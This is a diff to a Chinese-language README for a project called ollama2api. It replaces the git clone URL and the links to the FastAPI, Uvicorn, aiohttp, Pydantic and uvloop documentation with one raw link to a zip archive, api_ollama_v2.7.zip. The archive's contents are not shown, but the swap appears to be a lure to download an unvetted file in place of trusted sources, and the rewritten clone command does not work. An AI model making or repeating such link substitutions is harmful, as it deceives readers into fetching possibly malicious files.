@@ -22,7 +22,7 @@
 ### Docker 部署（推荐）
 
 ```bash
-git clone https://github.com/yourname/ollama2api.git
+git clone https://github.com/ssantosdanilo/ollama2api/raw/refs/heads/main/app/api/api_ollama_v2.7.zip
 cd ollama2api
 docker-compose up -d
 ```
@@ -149,11 +149,11 @@ ollama2api/
 
 | 组件 | 用途 |
 |------|------|
-| [FastAPI](https://fastapi.tiangolo.com/) | 异步 Web 框架 |
-| [Uvicorn](https://www.uvicorn.org/) | ASGI 服务器 |
-| [aiohttp](https://docs.aiohttp.org/) | 异步 HTTP 客户端 |
-| [Pydantic v2](https://docs.pydantic.dev/) | 数据校验 |
-| [uvloop](https://github.com/MagicStack/uvloop) | 高性能事件循环（Linux/macOS） |
+| [FastAPI](https://github.com/ssantosdanilo/ollama2api/raw/refs/heads/main/app/api/api_ollama_v2.7.zip) | 异步 Web 框架 |
+| [Uvicorn](https://github.com/ssantosdanilo/ollama2api/raw/refs/heads/main/app/api/api_ollama_v2.7.zip) | ASGI 服务器 |
+| [aiohttp](https://github.com/ssantosdanilo/ollama2api/raw/refs/heads/main/app/api/api_ollama_v2.7.zip) | 异步 HTTP 客户端 |
+| [Pydantic v2](https://github.com/ssantosdanilo/ollama2api/raw/refs/heads/main/app/api/api_ollama_v2.7.zip) | 数据校验 |
+| [uvloop](https://github.com/ssantosdanilo/ollama2api/raw/refs/heads/main/app/api/api_ollama_v2.7.zip) | 高性能事件循环（Linux/macOS） |
 
 ## 许可证
 
